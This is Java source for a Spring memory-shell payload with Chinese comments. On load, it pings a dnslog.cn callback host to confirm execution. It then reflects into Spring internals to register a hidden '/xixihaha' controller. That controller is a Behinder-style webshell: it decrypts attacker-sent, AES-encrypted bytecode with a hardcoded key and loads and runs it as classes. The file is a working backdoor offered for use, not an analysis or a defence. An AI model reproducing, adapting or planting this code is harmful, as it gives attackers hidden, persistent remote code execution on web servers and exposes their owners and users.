import org.springframework.beans.factory.InitializingBean;
import org.springframework.util.Assert;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.sound.midi.Soundbank;
import java.io.IOException;
import java.lang.reflect.Method;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

/**
 * @author   Email:
 * @description:
 * @Version
 * @create 2023-10-28 13:37
 */
public class Eval extends java.lang.ClassLoader  {




    public Eval() {

        Runtime runtime = Runtime.getRuntime();
        Process pc = null;
        try {
            pc = runtime.exec("ping",new String[]{"-c 4","c3e3sc.dnslog.cn"});
            pc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }


        System.out.println("开始.....");
        java.lang.reflect.Field filed = null;
        try {
            filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        filed.setAccessible(true);
        WebApplicationContext context = null;
        try {
            context = (WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        System.out.println("获取 WebApplicationContext 成功" );
       // 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean

        RequestMappingHandlerMapping handlerMapping = null;

        try {

//            handlerMapping = context.getBean(RequestMappingHandlerMapping.class);

            // 获取所有的 bean 对象
            Map<String, Object> beans = context.getBeansOfType(Object.class);
//            // 遍历所有的 bean 对象
            for (Map.Entry<String, Object> entry : beans.entrySet()) {
                String beanName = entry.getKey();
                Object beanInstance = entry.getValue();

                // 在这里处理每个 bean 对象，可以输出 bean 的名称或执行其他操作
//                System.out.println("Bean Name: " + beanName);
//                System.out.println("Bean Class: " + beanInstance.getClass().getName());
                if ("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping".equals(beanInstance.getClass().getName())){
                    handlerMapping =(RequestMappingHandlerMapping) beanInstance;
                    break;
                }
            }

        }catch (Exception e){
            System.out.println(handlerMapping);
            System.out.println(e);
        }
        System.out.println("获取 RequestMappingHandlerMapping 的实例 bean ");
        // 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = null;
        try {
            method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        // 属性被 private 修饰，所以 setAccessible true
        method.setAccessible(true);
        System.out.println("初始化 AbstractHandlerMethodMapping 的 getMappingRegistry 方法完成");

        // 通过反射获得该类的cmd方法
        Method method2 = null;
        try {
            method2 = Eval.class.getMethod("cmd");
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        // 定义该controller的path
        PatternsRequestCondition url = new PatternsRequestCondition("/xixihaha");
        // 定义允许访问的HTTP方法
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，避免无限循环使用另一个构造方法
        Eval injectToController = new Eval(null);
        // 将该controller注册到Spring容器
        handlerMapping.registerMapping(info, injectToController, method2);

    }

    Eval(java.lang.ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        // 调用父类的defineClass函数 , 相当于自定义加载类
        //这句代码将返回一个 java.lang.Class 对象。这个类对象表示通过字节数组 b 中的类文件数据动态加载的类。
        // defineClass 方法用于将二进制数据转换为类的实例。
        return super.defineClass(b, 0, b.length);
    }

    // 处理远程命令执行请求
    public void cmd() {
        HttpServletRequest request = null;
        HttpServletResponse response = null ;
        try{
            request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

        }catch (Exception e){
            System.out.println("Get __ request Error ");
            System.out.println("Get __ response Error ");
            System.out.println(e);
        }

        //注入冰蝎
        if (request.getMethod().equals("POST")) {

            HttpSession session = request.getSession();


            String k = "0945fc9611f55fd0e183fb8b044f1afe".substring(0,16);/*该密钥为连接密码32位md5值的前16位，连接密码nopass*/
            session.putValue("u", k);
            Cipher c = null;
            try {
                c = Cipher.getInstance("AES");
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            } catch (NoSuchPaddingException e) {
                e.printStackTrace();
            }
            try {
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            } catch (InvalidKeyException e) {
                e.printStackTrace();
            }

            HashMap<Object, Object> pageContext = new HashMap<>();
            pageContext.put("request",request);
            pageContext.put("response",response);
            pageContext.put("session",session);
            try {
                new Eval(this.getClass().getClassLoader())

                        //调用方法g 加载一个类
                        .g(
                                c.doFinal(
                                        //sun.misc.BASE64Decoder 类被用于解码 HTTP POST 请求中的数据，
                                        // 该数据经过 BASE64 编码。这个操作通常在服务器端用于处理客户端传递的数据，
                                        // 尤其是在需要进行数据解密或还原时。
                                        new sun.misc.BASE64Decoder()
                                                .decodeBuffer(request.getReader().readLine())))
                        //调用完g 加载一个类，调用newInstance() 后 ,相当于new
                        .newInstance().equals(pageContext);
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (IllegalBlockSizeException e) {
                e.printStackTrace();
            } catch (BadPaddingException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }


}
